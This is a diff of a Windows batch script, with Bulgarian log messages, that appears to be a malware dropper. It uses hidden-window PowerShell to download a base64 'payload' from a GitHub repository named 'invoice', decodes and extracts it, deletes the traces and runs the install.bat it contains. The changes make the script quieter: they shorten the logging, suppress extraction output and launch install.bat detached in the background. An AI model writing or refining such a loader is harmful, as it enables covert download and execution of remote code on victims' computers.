@@ -25,7 +25,7 @@ powershell -NoProfile -WindowStyle Hidden -Command ^
     "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Chupacabra-creator/invoice/main/payload.b64' -OutFile '%TEMP_B64%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }"
 
 if not exist "%TEMP_B64%" (
-    echo [!] Грешка при сваляне на payload.b64 >> "%LOG_FILE%"
+    echo [!] Грешка при сваляне >> "%LOG_FILE%"
     exit /b 1
 )
 
@@ -36,14 +36,9 @@ if not exist "%TEMP_ZIP%" (
     exit /b 1
 )
 
-echo [+] Разархивиране с PowerShell... >> "%LOG_FILE%"
+echo [+] Разархивиране... >> "%LOG_FILE%"
 powershell -NoProfile -WindowStyle Hidden -Command ^
-    "try { " ^
-    "Add-Type -AssemblyName System.IO.Compression.FileSystem; " ^
-    "[System.IO.Compression.ZipFile]::ExtractToDirectory('%TEMP_ZIP%', '%TARGET_DIR%', $true); " ^
-    "} catch { " ^
-    "Expand-Archive -LiteralPath '%TEMP_ZIP%' -DestinationPath '%TARGET_DIR%' -Force -ErrorAction Stop " ^
-    "}"
+    "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%TEMP_ZIP%', '%TARGET_DIR%', $true)" >nul 2>&1
 
 del "%TEMP_B64%" >nul 2>&1
 del "%TEMP_ZIP%" >nul 2>&1
@@ -52,10 +47,12 @@ cd /d "%TARGET_DIR%"
 dir /b >> "%LOG_FILE%"
 
 if exist "install.bat" (
-    echo [+] Стартиране на install.bat... >> "%LOG_FILE%"
-    call "install.bat" >> "%LOG_FILE%" 2>&1
+    echo [+] Стартиране на install.bat (без пренасочване на лог)... >> "%LOG_FILE%"
+    start "" /B cmd /c "install.bat"
+    timeout /t 5 /nobreak >nul
+    echo [+] install.bat е пуснат. >> "%LOG_FILE%"
 ) else (
-    echo [!] install.bat все още не е намерен. >> "%LOG_FILE%"
+    echo [!] install.bat не е намерен. >> "%LOG_FILE%"
 )
 
 echo =================================================== >> "%LOG_FILE%"
